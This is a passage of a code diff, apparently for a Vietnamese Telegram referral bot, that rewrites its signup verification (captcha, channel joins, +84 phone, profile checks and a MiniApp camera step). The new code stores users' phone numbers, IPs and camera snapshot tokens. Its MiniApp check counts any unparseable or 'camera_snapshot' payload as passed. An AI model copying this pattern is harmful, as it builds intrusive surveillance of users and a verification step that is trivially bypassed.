+            f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
+            parse_mode="HTML",
+        )
+        await proceed_next_verification(message, context, user)
+        return True
+
+    pending["attempts"] += 1
+    if pending["attempts"] >= 5:
+        pending_captcha_users.pop(user_id, None)
+        await message.reply_text(
+            f"{E['CROSS']} <b>Sai quá 5 lần!</b> Đang tạo captcha mới...",
+            parse_mode="HTML",
+        )
+    else:
+        await message.reply_text(
+            f"{E['CROSS']} <b>Sai captcha!</b> Còn <b>{5 - pending['attempts']}</b> lần thử. Đang tạo mã mới...",
+            parse_mode="HTML",
+        )
+    await send_captcha_challenge(message, context, user_id)
     return True
 
-# ============================================================
-# START
-# ============================================================
+
+async def _is_member(bot, chat_ref: str, user_id: int) -> bool:
+    try:
+        m = await bot.get_chat_member(_api_chat_id(chat_ref), user_id)
+        if m.status in ("member", "administrator", "creator"):
+            return True
+        if m.status == "restricted":
+            return bool(getattr(m, "is_member", True))
+        return False
+    except Exception as exc:
+        logger.warning("Không check được thành viên %s ở %s: %s", user_id, chat_ref, exc)
+        return False
+
+
+async def get_missing_channels(bot, user_id: int):
+    rows = await get_required_channels()
+    if not rows:
+        return []
+    results = await asyncio.gather(*[_is_member(bot, r[1], user_id) for r in rows])
+    missing = []
+    for (rid, ref, title, url), joined in zip(rows, results):
+        if not joined:
+            name = title or ref
+            missing.append(name)
+            CHANNEL_URLS[name] = url or (
+                f"https://t.me/{ref.lstrip('@')}" if ref.startswith("@") else None
+            )
+    return missing
+
+
+def build_channel_buttons(missing_channels):
+    buttons = []
+    for name in missing_channels:
+        url = CHANNEL_URLS.get(name)
+        if url:
+            buttons.append([ibtn(f"Tham gia {name}"[:60], random.choice(JOIN_BTN_EMOJI_IDS), url=url)])
+    buttons.append([ibtn("XÁC NHẬN ĐÃ THAM GIA", CONFIRM_JOIN_EMOJI_ID, callback_data="verify_join")])
+    return buttons
+
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if await handle_anti_spam(update, context):
         return
     user = update.effective_user
     chat = update.effective_chat
-    
     if not user or not chat:
         return
-        
     if chat.type != "private":
-        await db_query("INSERT INTO groups(chat_id) VALUES(%s) ON CONFLICT (chat_id) DO NOTHING", (chat.id,), commit=True)
+        await db_query(
+            "INSERT INTO groups(chat_id) VALUES(%s) ON CONFLICT (chat_id) DO NOTHING",
+            (chat.id,),
+            commit=True,
+        )
         return
     if await is_maintenance() and user.id not in ADMIN_IDS:
-        await update.message.reply_text(f"{E['STOP']} <b>HỆ THỐNG ĐANG BẢO TRÌ</b>\n{E['GEAR']} Bot đang thực hiện nâng cấp định kỳ, vui lòng quay lại sau!", parse_mode="HTML")
-        return
-
-    db_user = await ensure_user_exists(update)
-
-    if db_user and db_user[10] == 1:
-        await update.message.reply_text(f"{E['BAN']} <b>Tài khoản của bạn đã bị cấm vĩnh viễn khỏi hệ thống!</b>", parse_mode="HTML")
-        return
-
-    skip_ref = db_user[15] if len(db_user) > 15 else 0
-
-    if context.args and not db_user[4] and skip_ref == 0:
-        try:
-            ref_id = int(context.args[0])
-            if ref_id != user.id:
-                await db_query(
-                    "UPDATE users SET referrer_id=%s "
-                    "WHERE user_id=%s AND (referrer_id IS NULL OR referrer_id=0) AND skip_ref_once=0",
-                    (ref_id, user.id),
-                    commit=True,
-                )
-        except (ValueError, TypeError):
-            pass
-
-    if not await process_user_verification_flow(update, context, user.id):
-        return
-
-    await trigger_referral_reward_if_eligible(user.id, context)
-
-    await update.message.reply_text(
-        f"{E['LIGHTNING']} <b>CHÀO MỪNG BẠN TRỞ LẠI HỆ THỐNG!</b>\n{E['MEDAL1']} Hãy chọn một tính năng trong menu bên dưới:",
-        reply_markup=get_main_keyboard(),
-        parse_mode="HTML"
-    )
-
-# ============================================================
-# XỬ LÝ CHIA SẺ SỐ ĐIỆN THOẠI
-# ============================================================
-
-async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    message = update.effective_message
-    user = update.effective_user
-    if not message or not message.contact or not user:
-        return
-
-    contact = message.contact
-    if contact.user_id != user.id:
-        await message.reply_text("❌ Số điện thoại vừa chia sẻ không khớp với tài khoản Telegram của bạn.")
-        return
-
-    phone_number = contact.phone_number.strip()
-
-    normalized_phone = phone_number
-    if phone_number.startswith("84"):
-        normalized_phone = "+" + phone_number
-    elif phone_number.startswith("0"):
-        normalized_phone = "+84" + phone_number[1:]
-
-    if not normalized_phone.startswith("+84"):
-        await message.reply_text("❌ Yêu cầu tài khoản hợp lệ phải sử dụng **Số điện thoại Việt Nam (+84)**.", parse_mode="HTML")
-        await send_phone_verification_challenge(message, context)
-        return
-
-    full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
-    if len(full_name) > 20:
-        await message.reply_text(
-            f"❌ **Tên hiển thị quá dài!**\n"
-            f"Tên hiện tại của bạn có {len(full_name)} ký tự. Yêu cầu **không quá 20 ký tự** để xác minh.",
-            parse_mode="HTML"
+        await update.message.reply_text(
+            f"{E['BANDAGE']} <b>HỆ THỐNG ĐANG BẢO TRÌ</b>\n"
+            f"Bot đang thực hiện nâng cấp định kỳ, vui lòng quay lại sau!",
+            parse_mode="HTML",
         )
         return
 
-    if not user.username:
-        await message.reply_text(
-            "❌ **Chưa có Username!**\n"
-            "Vui lòng thiết lập Username (@) trong cài đặt tài khoản Telegram của bạn trước khi xác minh.",
-            parse_mode="HTML"
+    db_user = await db_query(
+        "SELECT user_id, is_banned, referrer_id, phone_number, ip_address, skip_ip, captcha_verified FROM users WHERE user_id=%s",
+        (user.id,),
+        fetchone=True,
+    )
+
+    if db_user and db_user[1] == 1:
+        user_ip = (
+            db_user[4] if (len(db_user) > 4 and db_user[4]) else "Không xác định"
+        )
+        await update.message.reply_text(
+            f"{E['GLOBE']} <b>PHÁT HIỆN TRÙNG IP!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"Địa chỉ IP <code>{user_ip}</code> đã được tài khoản khác sử dụng.\n"
+            f"Tài khoản của bạn đã bị <b>khóa vĩnh viễn</b> do trùng IP và full thông tin!",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove(),
         )
         return
 
-    try:
-        photos = await context.bot.get_user_profile_photos(user.id, limit=1)
-        if photos.total_count == 0:
-            await message.reply_text(
-                "❌ **Chưa có ảnh đại diện!**\n"
-                "Vui lòng tải lên ít nhất một ảnh đại diện (Avatar) cho tài khoản Telegram của bạn.",
-                parse_mode="HTML"
-            )
-            return
-    except Exception as exc:
-        logger.warning("Không kiểm tra được avatar user %s: %s", user.id, exc)
+    referrer_id = None
+    if not db_user:
+        if context.args:
+            try:
+                ref_id = int(context.args[0])
+                if ref_id != user.id:
+                    ref_exists = await db_query(
+                        "SELECT user_id FROM users WHERE user_id=%s",
+                        (ref_id,),
+                        fetchone=True,
+                    )
+                    if ref_exists:
+                        referrer_id = ref_id
+            except (ValueError, TypeError):
+                pass
 
-    await db_query(
-        "UPDATE users SET phone_number=%s, is_phone_verified=1 WHERE user_id=%s",
-        (normalized_phone, user.id),
-        commit=True
-    )
-
-    await message.reply_text(
-        f"{E['CHECK_ANIMATED']} Xác minh số điện thoại thành công!\n\n"
-        f"{E['REFRESH']} Đang kiểm tra điều kiện tiếp theo...",
-        parse_mode="HTML",
-        reply_markup=ReplyKeyboardRemove()
-    )
-
-    if await process_user_verification_flow(update, context, user.id):
-        await trigger_referral_reward_if_eligible(user.id, context)
-        await message.reply_text(
-            f"{E['CROWN']} <b>Chào mừng bạn đã hoàn tất toàn bộ xác minh!</b>",
-            reply_markup=get_main_keyboard(),
-            parse_mode="HTML"
+        await db_query(
+            "INSERT INTO users (user_id, username, balance, referrer_id, joined_at) VALUES (%s, %s, 0, %s, %s) ON CONFLICT (user_id) DO NOTHING",
+            (user.id, user.username or "", referrer_id, get_now_str()),
+            commit=True,
         )
-
-# ============================================================
-# GỬI CAPTCHA & CALLBACK
-# ============================================================
-
-async def send_captcha_challenge(update_or_query, context: ContextTypes.DEFAULT_TYPE, message_text=""):
-    a, b, correct_ans, options = generate_captcha()
-    context.user_data["captcha_ans"] = correct_ans
-    buttons = []
-    row = []
-    for opt in options:
-        row.append(InlineKeyboardButton(f"🔹 {opt}", callback_data=f"captcha_{opt}"))
-        if len(row) == 2:
-            buttons.append(row)
-            row = []
-    if row:
-        buttons.append(row)
-    caption = (f"{message_text}\n\n" if message_text else "")
-    caption += (
-        f"{E['GAME']} <b>XÁC MINH CAPTCHA BẢO MẬT</b>\n"
-        f"{E['PENCIL']} Vui lòng giải phép tính bên dưới để hoàn tất xác minh:\n"
-        f"{E['QUESTION']} <b>{a} + {b} = ?</b>"
-    )
-    if hasattr(update_or_query, "edit_message_text"):
-        await update_or_query.edit_message_text(caption, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
-    elif hasattr(update_or_query, "message") and update_or_query.message:
-        await update_or_query.message.reply_text(caption, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
     else:
-        user_id = update_or_query.from_user.id if hasattr(update_or_query, "from_user") else update_or_query.effective_user.id
-        await context.bot.send_message(chat_id=user_id, text=caption, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
-
-async def captcha_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query:
-        return
-    user = query.from_user
-    data = query.data or ""
-    try:
-        selected_ans = int(data.split("_")[1])
-    except (IndexError, ValueError):
-        return
-    correct_ans = context.user_data.get("captcha_ans")
-    if selected_ans != correct_ans:
-        try:
-            await query.answer("❌ Phép tính sai! Vui lòng thử lại.", show_alert=True)
-        except Exception:
-            pass
-        await send_captcha_challenge(query, context, message_text=f"{E['WARN1']} <b>Bạn đã chọn sai kết quả! Vui lòng tính lại.</b>")
-        return
-
-    context.user_data.pop("captcha_ans", None)
-
-    await ensure_user_exists(update)
-    await db_query("UPDATE users SET is_captcha_passed=1 WHERE user_id=%s", (user.id,), commit=True)
-
-    try:
-        await query.answer("✅ Xác minh CAPTCHA thành công!")
-        await query.edit_message_text(
-            f"{E['CHECK_ANIMATED']} Xác minh captcha thành công!\n\n"
-            f"{E['REFRESH']} Đang kiểm tra điều kiện tiếp theo...",
-            parse_mode="HTML"
+        await db_query(
+            "UPDATE users SET username=%s WHERE user_id=%s",
+            (user.username or "", user.id),
+            commit=True,
         )
-    except Exception:
-        pass
 
-    if await process_user_verification_flow(update, context, user.id):
-        await trigger_referral_reward_if_eligible(user.id, context)
-        await context.bot.send_message(chat_id=user.id, text=f"{E['CROWN']} <b>Xác minh hoàn tất!</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
+    await proceed_next_verification(update.message, context, user)
 
-# ============================================================
-# VERIFY JOIN
-# ============================================================
 
-async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def verify_join_callback(
+    update: Update, context: ContextTypes.DEFAULT_TYPE
+):
     query = update.callback_query
     if not query:
         return
@@ -893,9 +1225,11 @@ async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYP
         missing_text = "\n".join([f"• <b>{ch}</b>" for ch in missing_channels])
         try:
             await query.edit_message_text(
-                f"{E['ALERT1']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n━━━━━━━━━━━━━━━━━━\n"
-                f"{E['STOP']} Bạn vẫn chưa tham gia đủ <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n{missing_text}\n\n"
-                f"{E['CLIP']} Vui lòng tham gia đầy đủ rồi bấm nút bên dưới để xác nhận lại!",
+                f"{E['BANDAGE']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"{E['WARN']} Bạn vẫn chưa tham gia đủ <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n"
+                f"{missing_text}\n\n"
+                f"{E['RIGHT']} Vui lòng tham gia đầy đủ rồi bấm nút bên dưới để xác nhận lại!",
                 reply_markup=InlineKeyboardMarkup(buttons),
                 parse_mode="HTML",
             )
@@ -903,1507 +1237,3917 @@ async def verify_join_callback(update: Update, context: ContextTypes.DEFAULT_TYP
             pass
         return
 
-    if await process_user_verification_flow(update, context, user.id):
-        await trigger_referral_reward_if_eligible(user.id, context)
-        await context.bot.send_message(chat_id=user.id, text=f"{E['LAUGH1']} <b>Bạn đã hoàn tất tất cả xác minh!</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
+    if await get_verify_setting("verify_captcha") and not await check_captcha_verified(
+        user.id
+    ):
+        try:
+            await query.delete_message()
+        except Exception:
+            pass
+        await send_captcha_challenge(query.message, context, user.id)
+    else:
+        try:
+            await query.delete_message()
+        except Exception:
+            pass
+        await finalize_user_registration(user, context)
 
-# ============================================================
-# MINIAPP CHECK IP, VPN & PROXY
-# ============================================================
+
+async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    message = update.effective_message
+    user = update.effective_user
+    if not message or not message.contact or not user:
+        return
+    contact = message.contact
+    if contact.user_id != user.id:
+        await message.reply_text(
+            f"{E['CROSS']} <b>Số điện thoại xác minh không thuộc về tài khoản Telegram này!</b>",
+            parse_mode="HTML",
+            reply_markup=get_contact_keyboard(),
+        )
+        return
+    phone = contact.phone_number or ""
+    if not (phone.startswith("84") or phone.startswith("+84")):
+        await message.reply_text(
+            f"{E['CROSS']} <b>Yêu cầu bị từ chối!</b>\nHệ thống chỉ chấp nhận số điện thoại Việt Nam (+84).",
+            parse_mode="HTML",
+            reply_markup=get_contact_keyboard(),
+        )
+        return
+    full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
+    if len(full_name) > 20:
+        await message.reply_text(
+            f"{E['CROSS']} <b>Tên hiển thị không hợp lệ!</b>\n"
+            f"Tên tài khoản của bạn hiện dài <b>{len(full_name)}</b> ký tự (yêu cầu không quá 20 ký tự).\n"
+            f"Vui lòng đổi lại tên hiển thị ngắn hơn và thử lại!",
+            parse_mode="HTML",
+            reply_markup=get_contact_keyboard(),
+        )
+        return
+    if not user.username:
+        await message.reply_text(
+            f"{E['CROSS']} <b>Chưa thiết lập Username!</b>\n"
+            f"Tài khoản của bạn chưa cài đặt username (@username).\n"
+            f"Vui lòng truy cập Cài đặt Telegram -> Tạo Username rồi nhấn xác minh lại!",
+            parse_mode="HTML",
+            reply_markup=get_contact_keyboard(),
+        )
+        return
+    try:
+        user_photos = await context.bot.get_user_profile_photos(user.id, limit=1)
+        if user_photos.total_count == 0:
+            await message.reply_text(
+                f"{E['CROSS']} <b>Thiếu ảnh đại diện!</b>\n"
+                f"Tài khoản của bạn cần phải có ảnh đại diện (avatar).\n"
+                f"Vui lòng cập nhật ảnh đại diện cho Telegram rồi thử lại!",
+                parse_mode="HTML",
+                reply_markup=get_contact_keyboard(),
+            )
+            return
+    except Exception as exc:
+        logger.warning(f"Lỗi kiểm tra avatar user {user.id}: {exc}")
+
+    await db_query(
+        "UPDATE users SET phone_number=%s WHERE user_id=%s",
+        (phone, user.id),
+        commit=True,
+    )
+    await message.reply_text(
+        f"{E['CHECK']} Xác minh số điện thoại thành công!\n\n"
+        f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
+        parse_mode="HTML",
+        reply_markup=ReplyKeyboardRemove(),
+    )
+    await proceed_next_verification(message, context, user)
+
+
+async def handle_miniapp_captcha_data(
+    message, context: ContextTypes.DEFAULT_TYPE, user, data: dict
+):
+    uid = user.id
+
+    if (
+        not await get_verify_setting("verify_miniapp_captcha")
+        and not await get_verify_setting("verify_camera")
+        and not await get_verify_setting("verify_cccam")
+    ):
+        await proceed_next_verification(message, context, user)
+        return
+
+    pending = pending_miniapp_captcha.get(uid)
+    token_from_app = str(data.get("token", "")) if data.get("token") else None
+    not_expired = bool(pending and datetime.now() <= pending["expires_at"])
+    passed = (
+        data.get("passed") is True
+        or data.get("type") in ("camera_snapshot", "cccam")
+    )
+
+    token_ok = True
+    if token_from_app is not None and pending:
+        token_ok = token_from_app == pending["token"]
+
+    if not (pending and not_expired and token_ok and passed):
+        await message.reply_text(
+            f"{E['CROSS']} <b>Xác minh captcha MiniApp thất bại!</b>\n"
+            f"{E['WARN']} Vui lòng bấm lại nút <b>🧩 XÁC MINH CAPTCHA & TRUY CẬP CAMERA</b> và hoàn thành đúng.",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove(),
+        )
+        if not (pending and not_expired):
+            pending_miniapp_captcha.pop(uid, None)
+            await prompt_miniapp_captcha_verification(message, uid, is_retry=True)
+        else:
+            await prompt_miniapp_captcha_verification(message, uid)
+        return
+
+    camera_token = pending["token"] if pending else None
+    pending_miniapp_captcha.pop(uid, None)
+
+    await db_query(
+        "UPDATE users SET miniapp_captcha_verified=1, camera_verified=1, cccam_verified=1, "
+        "camera_photo_token=COALESCE(%s, camera_photo_token) WHERE user_id=%s",
+        (camera_token, uid),
+        commit=True,
+    )
+
+    await message.reply_text(
+        f"{E['CHECK']} Xác minh Captcha & Camera thành công!\n\n"
+        f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
+        parse_mode="HTML",
+        reply_markup=ReplyKeyboardRemove(),
+    )
+    await proceed_next_verification(message, context, user)
+
 
 async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.effective_message
     user = update.effective_user
-    if not message or not user or not message.web_app_data:
+    if not message or not message.web_app_data or not user:
         return
-
-    raw_data = message.web_app_data.data
-    ip_addr = ""
-    is_vpn_proxy = False
-
     try:
-        data_json = json.loads(raw_data)
-        ip_addr = data_json.get("ip") or data_json.get("ip_address") or ""
-        # Kiểm tra cờ VPN hoặc Proxy từ Mini App gửi lên (Ví dụ: is_vpn=True, is_proxy=True, vpn=True, proxy=True)
-        is_vpn_proxy = bool(
-            data_json.get("is_vpn") or data_json.get("vpn") or 
-            data_json.get("is_proxy") or data_json.get("proxy") or
-            data_json.get("tor")
-        )
-    except Exception:
-        ip_addr = raw_data.strip()
-
-    if not ip_addr:
-        await message.reply_text("❌ Không thể lấy địa chỉ IP từ Miniapp, vui lòng thử lại.")
-        return
-
-    db_user = await get_fresh_user(user.id)
-    if not db_user:
-        return
-
-    # 1. Phát hiện bật VPN hoặc Proxy -> Khóa vĩnh viễn và gửi thông tin vào nhóm
-    if is_vpn_proxy:
-        await db_query("UPDATE users SET is_banned=1, ip_address=%s WHERE user_id=%s", (ip_addr, user.id), commit=True)
-        user_withdraw_state.pop(user.id, None)
-        
-        reason = "Phát hiện sử dụng VPN hoặc Proxy ẩn danh qua Mini App"
-        await send_ban_alert_to_group(context.bot, user.id, user.username, ip_addr, reason)
-
-        await message.reply_text(
-            f"{E['BAN']} <b>HỆ THỐNG PHÁT HIỆN SỬ DỤNG VPN/PROXY!</b>\n━━━━━━━━━━━━━━━━━━\n"
-            f"{E['STOP']} Bạn đang sử dụng mạng ẩn danh (VPN/Proxy) để truy cập.\n"
-            f"{E['ALERT1']} <b>Tài khoản của bạn đã bị khóa vĩnh viễn và gửi báo cáo về hệ thống!</b>",
-            parse_mode="HTML"
-        )
-        return
-
-    if db_user[14] == 1:
-        await db_query("UPDATE users SET ip_address=%s WHERE user_id=%s", (ip_addr, user.id), commit=True)
-        await message.reply_text(
-            f"{E['CHECK_ANIMATED']} Xác minh IP thành công!\n\n"
-            f"{E['REFRESH']} Đang kiểm tra điều kiện tiếp theo...",
-            reply_markup=get_main_keyboard(),
-            parse_mode="HTML"
-        )
-        return
-
-    # 2. Phát hiện trùng IP -> Khóa vĩnh viễn và gửi thông tin vào nhóm
-    existing_ip_user = await db_query("SELECT user_id FROM users WHERE ip_address=%s AND user_id != %s AND skip_ip_check = 0", (ip_addr, user.id), fetchone=True)
-
-    if existing_ip_user:
-        await db_query("UPDATE users SET is_banned=1, ip_address=%s WHERE user_id=%s", (ip_addr, user.id), commit=True)
-        user_withdraw_state.pop(user.id, None)
-
-        reason = f"Trùng địa chỉ IP với tài khoản ID: {existing_ip_user[0]}"
-        await send_ban_alert_to_group(context.bot, user.id, user.username, ip_addr, reason)
-
-        await message.reply_text(
-            f"{E['BAN']} <b>HỆ THỐNG PHÁT HIỆN TRÙNG IP!</b>\n━━━━━━━━━━━━━━━━━━\n"
-            f"{E['STOP']} Địa chỉ IP <code>{ip_addr}</code> đã trùng với tài khoản <code>{existing_ip_user[0]}</code>.\n"
-            f"{E['ALERT1']} <b>Tài khoản của bạn đã bị khóa vĩnh viễn khỏi hệ thống!</b>",
-            parse_mode="HTML"
-        )
-        return
-
-    await db_query("UPDATE users SET ip_address=%s WHERE user_id=%s", (ip_addr, user.id), commit=True)
-
-    await message.reply_text(
-        f"{E['CHECK_ANIMATED']} Xác minh IP thành công!\n\n"
-        f"{E['REFRESH']} Đang kiểm tra điều kiện tiếp theo...",
-        parse_mode="HTML",
-        reply_markup=ReplyKeyboardRemove()
-    )
-
-    if await process_user_verification_flow(update, context, user.id):
-        await trigger_referral_reward_if_eligible(user.id, context)
-        await message.reply_text(f"{E['CROWN']} <b>Chào mừng bạn đã gia nhập hệ thống Bot VIP!</b>", reply_markup=get_main_keyboard(), parse_mode="HTML")
-
-# ============================================================
-# LỆNH ADMIN PANEL
-# ============================================================
-
-async def admin_menu_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update):
-        return
-
-    c_chan = "🟢 BẬT" if await get_setting("check_channels") else "🔴 TẮT"
-    c_phn = "🟢 BẬT" if await get_setting("check_phone") else "🔴 TẮT"
-    c_ip = "🟢 BẬT" if await get_setting("check_ip") else "🔴 TẮT"
-    c_cap = "🟢 BẬT" if await get_setting("check_captcha") else "🔴 TẮT"
-    c_wd = "🟢 BẬT" if await get_setting("enable_withdraw") else "🔴 TẮT"
-
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton(f"1. Check Kênh: {c_chan}", callback_data="toggle_check_channels")],
-        [InlineKeyboardButton(f"2. Check SĐT (+84): {c_phn}", callback_data="toggle_check_phone")],
-        [InlineKeyboardButton(f"3. Check IP Miniapp: {c_ip}", callback_data="toggle_check_ip")],
-        [InlineKeyboardButton(f"4. Check Captcha: {c_cap}", callback_data="toggle_check_captcha")],
-        [InlineKeyboardButton(f"💳 Tính năng Rút Tiền: {c_wd}", callback_data="toggle_enable_withdraw")],
-        [InlineKeyboardButton("🔄 Xác Minh Toàn Bộ", callback_data="force_verify_all")],
-    ])
-
-    msg_text = (
-        f"{E['GEAR']} <b>MENU QUẢN LÝ BẬT/TẮT HỆ THỐNG</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"Bấm vào các nút bên dưới để Bật hoặc Tắt nhanh tính năng tương ứng hoặc yêu cầu xác minh lại:"
-    )
-
-    if update.callback_query:
+        raw_data = message.web_app_data.data
         try:
-            await update.callback_query.edit_message_text(msg_text, reply_markup=kb, parse_mode="HTML")
-        except Exception: pass
-    else:
-        await update.effective_message.reply_text(msg_text, reply_markup=kb, parse_mode="HTML")
-
-async def admin_toggle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query or query.from_user.id not in ADMIN_IDS: return
-    try: await query.answer()
-    except Exception: pass
-
-    data = query.data or ""
-    key = data.replace("toggle_", "")
-    curr = await get_setting(key)
-    await set_setting(key, "0" if curr else "1")
-    await admin_menu_panel(update, context)
-
-async def force_verify_all_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query or query.from_user.id not in ADMIN_IDS:
-        return
-    try:
-        await query.answer()
-    except Exception:
-        pass
-
-    await db_query(
-        "UPDATE users SET is_captcha_passed=0, is_phone_verified=0, ip_address=NULL, skip_ip_check=0, ref_rewarded=0",
-        commit=True
-    )
-
-    await set_setting("check_channels", "1")
-    await set_setting("check_phone", "1")
-    await set_setting("check_ip", "1")
-    await set_setting("check_captcha", "1")
-
-    try:
-        await query.edit_message_text(
-            f"{E['CHECK_ANIMATED']} <b>ĐÃ XÁC MINH LẠI TOÀN BỘ HỆ THỐNG THÀNH CÔNG!</b>\n"
-            f"• Toàn bộ các bước (Kênh, SĐT +84, IP, Captcha) đã được kích hoạt bắt buộc.\n"
-            f"• Thành viên khi bấm /start sẽ phải thực hiện lại từ đầu.",
-            parse_mode="HTML"
-        )
-    except Exception:
-        pass
-
-async def ip_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update): return
-    args = context.args or []
-    if not args:
-        await update.effective_message.reply_text(f"{E['CLIP']} <b>Cú pháp:</b> <code>/ip USER_ID</code>", parse_mode="HTML")
-        return
-    try:
-        target_id = int(args[0])
-    except ValueError:
-        await update.effective_message.reply_text("❌ USER_ID không hợp lệ.")
-        return
-
-    await db_query("UPDATE users SET skip_ip_check=1 WHERE user_id=%s", (target_id,), commit=True)
-    await update.effective_message.reply_text(f"{E['THUMB']} <b>Đã thiết lập BỎ QUA KIỂM TRA IP cho ID:</b> <code>{target_id}</code>", parse_mode="HTML")
-
-async def ipx_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update): return
-    args = context.args or []
-    if not args:
-        await update.effective_message.reply_text(f"{E['CLIP']} <b>Cú pháp:</b> <code>/ipx USER_ID</code>", parse_mode="HTML")
-        return
-    try:
-        target_id = int(args[0])
-    except ValueError:
-        await update.effective_message.reply_text("❌ USER_ID không hợp lệ.")
-        return
-
-    await db_query("UPDATE users SET is_banned=0, skip_ip_check=1, ip_address=NULL WHERE user_id=%s", (target_id,), commit=True)
-    await update.effective_message.reply_text(f"{E['THUMB']} <b>Đã MỞ KHÓA trùng IP & BỎ QUA KIỂM TRA IP cho ID:</b> <code>{target_id}</code>", parse_mode="HTML")
-
-# ============================================================
-# LỆNH /spl - XÓA LỊCH SỬ MỜI BẠN BÈ THEO NGÀY
-# ============================================================
-
-def parse_date_input(text: str):
-    if not text:
-        return None
-    text = text.strip()
-    patterns = [
-        ("%d-%m-%Y", r"^\d{1,2}-\d{1,2}-\d{4}$"),
-        ("%Y-%m-%d", r"^\d{4}-\d{1,2}-\d{1,2}$"),
-        ("%d/%m/%Y", r"^\d{1,2}/\d{1,2}/\d{4}$"),
-    ]
-    for fmt, regex in patterns:
-        if re.match(regex, text):
-            try:
-                dt = datetime.strptime(text, fmt)
-                return dt.strftime("%Y-%m-%d")
-            except ValueError:
-                return None
-    return None
-
-async def spl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update):
-        return
-    message = update.effective_message
-    user = update.effective_user
-    if not message or not user:
-        return
-
-    admin_spl_state[user.id] = {"step": "WAITING_DATE"}
-
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("❌ HỦY THAO TÁC", callback_data="spl_cancel")]
-    ])
-
-    await message.reply_text(
-        f"{E['ALERT1']} <b>XÁC NHẬN XÓA LỊCH SỬ MỜI BẠN BÈ</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"{E['WARN1']} Thao tác này sẽ <b>XÓA VĨNH VIỄN</b> toàn bộ lịch sử mời bạn bè!\n"
-        f"{E['CALENDAR']} Bot sẽ xóa tất cả người được mời <b>từ ngày bạn nhập trở đi</b>.\n\n"
-        f"{E['ARROW_DOWN']} Vui lòng nhập ngày bắt đầu xóa.\n"
-        f"<b>Ví dụ:</b> <code>01-10-2026</code>\n\n"
-        f"{E['CLIP']} Các định dạng hỗ trợ:\n"
-        f"• <code>01-10-2026</code> (dd-mm-yyyy)\n"
-        f"• <code>2026-10-01</code> (yyyy-mm-dd)\n"
-        f"• <code>01/10/2026</code> (dd/mm/yyyy)",
-        reply_markup=kb,
-        parse_mode="HTML"
-    )
-
-async def spl_cancel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query or query.from_user.id not in ADMIN_IDS:
-        return
-    try:
-        await query.answer()
-    except Exception:
-        pass
-    admin_spl_state.pop(query.from_user.id, None)
-    try:
-        await query.edit_message_text(
-            f"{E['BAN']} <b>Đã hủy thao tác xóa lịch sử mời bạn bè.</b>",
-            parse_mode="HTML"
-        )
-    except Exception:
-        pass
-
-async def spl_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    if not query or query.from_user.id not in ADMIN_IDS:
-        return
-    try:
-        await query.answer()
-    except Exception:
-        pass
-
-    data = query.data or ""
-    parts = data.split("_", 2)
-    if len(parts) < 3:
-        return
-    date_iso = parts[2]
-
-    state = admin_spl_state.get(query.from_user.id)
-    if not state or state.get("step") != "WAITING_CONFIRM":
-        try:
-            await query.edit_message_text(
-                f"{E['ALERT1']} <b>Yêu cầu đã hết hạn hoặc không hợp lệ. Vui lòng dùng /spl lại.</b>",
-                parse_mode="HTML"
-            )
+            data = json.loads(raw_data)
         except Exception:
-            pass
-        return
+            data = {"type": "camera_snapshot"}
 
-    try:
-        def do_delete(cursor):
-            cursor.execute(
-                """
-                SELECT user_id, referrer_id
-                FROM users
-                WHERE referrer_id IS NOT NULL
-                  AND referrer_id <> 0
-                  AND joined_at IS NOT NULL
-                  AND joined_at >= %s
-                """,
-                (date_iso + " 00:00:00",)
+        dtype = data.get("type")
+
+        if dtype == "camera_denied":
+            await db_query(
+                "UPDATE users SET captcha_verified=0, miniapp_captcha_verified=0, camera_verified=0, cccam_verified=0 WHERE user_id=%s",
+                (user.id,),
+                commit=True,
             )
-            rows = cursor.fetchall()
+            pending_miniapp_captcha.pop(user.id, None)
+            pending_captcha_users.pop(user.id, None)
+            pending_camera_verified.discard(user.id)
 
-            removed_count = 0
-            referrer_affected = set()
-            total_reward_removed = 0
+            await message.reply_text(
+                f"{E['WARN']} <b>VUI LÒNG CHO PHÉP TRUY CẬP CAMERA!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
